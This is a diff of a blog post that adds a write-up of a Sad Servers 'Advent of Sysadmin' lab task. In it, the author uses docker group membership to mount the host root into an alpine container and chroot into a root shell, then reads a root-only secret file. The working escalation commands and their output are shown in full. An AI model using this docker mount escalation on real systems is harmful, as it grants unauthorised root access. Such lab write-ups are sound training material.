@@ -14,7 +14,7 @@ Advent season is here! And that means advent challenges as well!
 
 After a [disastrous attempt](https://github.com/hatedabamboo/AoC2024) at Advent of Code last year, this year I was very happy to see that Sad Servers started an Advent challenge of their own -- [Advent of Sysadmin](https://sadservers.com/advent)! At last, a challenge I can (hopefully) progress further than task 3. And this means more challenges for us to tackle. The Advent will consist of 12 challenges. To keep things slightly more interesting, I will publish the solution to each task the day after it's released: for example, today, on December 2, I will solve the task from December 1, and so on. Have fun!
 
-*Task from December 6 is now available!*
+*Task from December 7 is now available!*
 
 <!-- more -->
 
@@ -568,6 +568,86 @@ AND create_time < '2025-09-31'
 ```
 
 `jq` is awesome; I really like its simplicity and powerful functionality. I definitely would have solved this task faster than 29 minutes if I had read the description correctly the first time and hadn’t tried to force the Volume ID into the solution, wondering why it wasn’t working.
+
+## Annapurna: High privileges
+
+::: note Description
+
+    You are logged in as the user *admin*.
+
+    *You have been tasked with auditing the admin user privileges in this server; "admin" should not have sudo (root) access.*
+
+    *Exploit this server so you as the admin user can read the file /root/secret.txt*
+    *Save the content of /root/secret.txt to the file /home/admin/mysolution.txt , for example: `echo "secret" > ~/mysolution.txt`*
+
+:::
+
+From the looks of it, this task seems to be similar to the one we had before. Let's see if that is true.
+
+```bash
+admin@i-05b3bee998a4a6d6c:~$ sudo -l
+Matching Defaults entries for admin on i-05b3bee998a4a6d6c:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User admin may run the following commands on i-05b3bee998a4a6d6c:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /sbin/shutdown
+```
+
+Ah, not quite. This time we actually don’t have any superuser permissions. But let’s see what we do have.
+
+```bash
+admin@i-05b3bee998a4a6d6c:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),989(docker)
+admin@i-05b3bee998a4a6d6c:~$ docker ps -a
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+admin@i-05b3bee998a4a6d6c:~$ docker images
+REPOSITORY   TAG       IMAGE ID       CREATED      SIZE
+alpine       latest    7acffee03fe8   4 days ago   8.44MB
+```
+
+Oh, this time we have a docker image! And `alpine` of all things! This might possibly be the lead to the solution of the task. To confirm the suspicion, let's check whether we can mount the filesystem root to the container.
+
+```bash
+admin@i-05b3bee998a4a6d6c:~$ docker run -it -v /:/host/ alpine chroot /host/ bash
+root@6d7650a3aef7:/# ls -l
+total 3145788
+lrwxrwxrwx   1 root root          7 May 12  2025 bin -> usr/bin
+drwxr-xr-x   4 root root       4096 Aug 14 04:28 boot
+drwxr-xr-x  14 root root       3000 Dec  8 08:06 dev
+drwxr-xr-x  73 root root       4096 Dec  8 08:06 etc
+drwxr-xr-x   3 root root       4096 Sep  7 16:29 home
+lrwxrwxrwx   1 root root          7 May 12  2025 lib -> usr/lib
+lrwxrwxrwx   1 root root          9 May 12  2025 lib64 -> usr/lib64
+drwx------   2 root root      16384 Aug 14 04:24 lost+found
+drwxr-xr-x   2 root root       4096 Aug 14 04:25 media
+drwxr-xr-x   2 root root       4096 Aug 14 04:25 mnt
+drwxr-xr-x   3 root root       4096 Sep  7 16:35 opt
+dr-xr-xr-x 148 root root          0 Dec  8 08:06 proc
+drwx------   3 root root       4096 Dec  7 14:49 root
+drwxr-xr-x  24 root root        600 Dec  8 08:06 run
+lrwxrwxrwx   1 root root          8 May 12  2025 sbin -> usr/sbin
+drwxr-xr-x   2 root root       4096 Aug 14 04:25 srv
+-rw-------   1 root root 3221225472 Sep  7 16:32 swapfile
+dr-xr-xr-x  13 root root          0 Dec  8 08:07 sys
+drwxrwxrwt   8 root root        160 Dec  8 08:18 tmp
+drwxr-xr-x  12 root root       4096 Aug 14 04:25 usr
+drwxr-xr-x  11 root root       4096 Sep  7 16:29 var
+```
+
+And indeed we can. This turned out to be much simpler than I expected. The rest should be an easy road.
+
+```bash
+root@6d7650a3aef7:/# cd /root/
+root@6d7650a3aef7:~# ls -l
+total 4
+-rw------- 1 root root 21 Dec  7 14:49 mysecret.txt
+root@6d7650a3aef7:~# cat mysecret.txt  > /home/admin/mysolution.txt
+root@6d7650a3aef7:~# bash /home/admin/agent/check.sh 
+OK
+```
+
+And yet another task is solved! See you in the next one!
 
 ---
 
